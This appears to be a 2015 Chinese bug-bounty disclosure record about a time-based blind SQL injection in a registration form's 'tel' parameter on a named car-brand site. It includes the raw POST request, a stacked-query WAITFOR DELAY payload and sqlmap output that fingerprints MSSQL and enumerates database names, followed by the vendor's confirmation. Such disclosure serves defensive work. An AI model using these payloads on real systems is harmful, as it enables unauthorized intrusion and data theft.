wybug_detail:
漏洞详情 披露状态：   									2015-06-23：	细节已通知厂商并且等待厂商处理中									2015-06-23：	厂商已经确认，细节仅向厂商公开									2015-07-03：	细节向核心白帽子及相关领域专家公开									2015-07-13：	细节向普通白帽子公开									2015-07-23：	细节向实习白帽子公开									2015-08-07：	细节向公众公开  简要描述： 看见有礼物  我就无耻的来检测了···· 详细说明：  SQL注入来自分站：http://mazda.vcyber.com/   以下为本次测试内容POST数据包：
POST /User/QuickRegisterAjax?time=1434889120359 HTTP/1.1Host: mazda.vcyber.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/plain, */*; q=0.01Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestReferer: http://mazda.vcyber.com/User/QuickRegisterContent-Length: 121Cookie: Hm_lvt_0a20432bd2ea45c98b42bf5a4160022d=1434418517,1434889090; ASP.NET_SessionId=ce5ywlbudc3tkvvxfznku2i0; Hm_lpvt_0a20432bd2ea45c98b42bf5a4160022d=1434889121; Hm_lvt_5777ef8be1c2ed5cbc632a9ff5247ffc=1434889097; Hm_lpvt_5777ef8be1c2ed5cbc632a9ff5247ffc=1434889097X-Forwarded-For: 8.8.8.8'Connection: keep-alivePragma: no-cacheCache-Control: no-cacheusercode=1111111&userpwd=111111&tel=13800138000&logincode=1111&loginpwd=123456&gender=%E7%94%B7&realName=123333&telnum=86
tel 参数 导致了本次基于时间上的盲注（具体参数见下图以及漏洞证明）



由于时间注入太慢了  我就不深入了   漏洞证明：  
POST parameter 'tel' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 94 HTTP(s) requests:---Parameter: tel (POST)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: usercode=1111111&userpwd=111111&tel=13800138000';WAITFOR DELAY '0:0:5'--&logincode=1111&loginpwd=123456&gender=%E7%94%B7&realName=123333&telnum=86---[20:31:18] [INFO] testing Microsoft SQL Server[20:31:18] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errorsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n] y[20:31:33] [INFO] confirming Microsoft SQL Server[20:31:44] [INFO] adjusting time delay to 4 seconds due to good response times[20:31:45] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005[20:31:45] [INFO] fetching database names[20:31:45] [INFO] fetching number of databases[20:31:45] [INFO] retrieved: 24[20:31:59] [INFO] retrieved: Apecn.MusicDB[20:35:32] [INFO] retrieved: AroundSystemDB[20:39:40] [INFO] retrieved: Car

wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-06-23 16:54 厂商回复： 谢谢 最新状态： 暂无
